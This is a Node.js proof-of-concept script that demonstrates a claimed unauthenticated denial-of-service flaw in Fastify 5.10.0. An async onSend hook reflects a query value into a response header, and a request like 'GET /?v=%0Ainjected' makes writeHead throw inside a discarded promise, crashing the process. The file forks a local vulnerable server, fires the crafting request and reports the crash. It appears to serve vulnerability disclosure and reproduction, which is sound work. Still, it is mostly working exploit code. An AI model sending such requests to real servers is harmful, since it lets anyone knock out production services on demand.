'use strict'
/*
 * PoC — I1: Remote unauthenticated process crash in Fastify 5.10.0
 * ---------------------------------------------------------------------------
 * A single unauthenticated HTTP request crashes the entire Fastify process
 * when the application has an ASYNC `onSend` (or `preSerialization`) hook that
 * reflects a request-derived value into a response header.
 *
 * Root cause: the async hook-runner continuation in lib/hooks.js:303-310 runs
 * the terminal callback (onSendEnd -> safeWriteHead -> res.writeHead) inside a
 * DISCARDED promise with no try/catch. When writeHead throws ERR_INVALID_CHAR
 * on the attacker-controlled header value, it becomes an unhandledRejection and
 * Node (>=15) aborts the process.
 *
 * This script is self-contained. It forks a child that runs the vulnerable
 * server, sends ONE malicious request from the parent, and reports whether the
 * child process died. (Forking keeps the crash isolated to the child so this
 * harness can print a clean verdict.)
 *
 *   Run:  node poc.js
 */
const path = require('path')
const { fork } = require('child_process')
const http = require('http')

const FASTIFY = path.join(__dirname, '..', '..', 'fastify.js')

// --------------------------------------------------------------------------
// CHILD ROLE: the vulnerable server
// --------------------------------------------------------------------------
if (process.env.POC_ROLE === 'server') {
  const Fastify = require(FASTIFY)
  const app = Fastify({ logger: false })

  // A common, benign-looking pattern: an ASYNC onSend hook that echoes a
  // request-controlled value into a response header (correlation id, CORS
  // origin reflection, trace header, etc.).
  app.addHook('onSend', async (req, reply, payload) => {
    reply.header('x-echo', req.query.v || '')
    return payload
  })

  app.get('/', async () => ({ ok: true }))

  app.listen({ port: 0, host: '127.0.0.1' })
    .then(() => process.send({ port: app.server.address().port }))
    .catch((e) => { console.error('server failed to start', e); process.exit(2) })
  return
}

// --------------------------------------------------------------------------
// PARENT ROLE: the attacker + harness
// --------------------------------------------------------------------------
console.log('=== I1 PoC: remote unauthenticated process crash ===\n')

const child = fork(__filename, [], {
  env: { ...process.env, POC_ROLE: 'server' },
  stdio: ['ignore', 'inherit', 'inherit', 'ipc'] // inherit so we SEE the crash stack
})

let exited = false

child.on('message', ({ port }) => {
  console.log(`[harness] vulnerable server up on 127.0.0.1:${port}`)
  console.log('[harness] firing ONE unauthenticated request:  GET /?v=%0Ainjected')
  console.log('          (%0A = newline -> invalid HTTP header character)\n')

  const req = http.get({ host: '127.0.0.1', port, path: '/?v=%0Ainjected' }, (res) => {
    let b = ''
    res.on('data', (d) => (b += d))
    res.on('end', () => {
      console.log(`[harness] UNEXPECTED: got HTTP ${res.statusCode} — server did not crash`)
    })
  })
  req.on('error', (e) => {
    console.log(`[harness] client socket error: ${e.code} (expected: server died mid-response)`)
  })
})

child.on('exit', (code, signal) => {
  exited = true
  console.log(`\n[harness] SERVER PROCESS EXITED  code=${code}  signal=${signal}`)
  if (code !== 0) {
    console.log('\n==> VULNERABLE: a single unauthenticated request crashed the whole server process.')
    console.log('    In production every worker can be killed on demand -> full denial of service.')
    process.exit(0)
  } else {
    console.log('\n==> NOT reproduced: the server survived (exit 0).')
    process.exit(1)
  }
})

setTimeout(() => {
  if (!exited) {
    console.log('\n[harness] server survived 5s — not reproduced in this environment')
    child.kill('SIGKILL')
    process.exit(1)
  }
}, 5000)
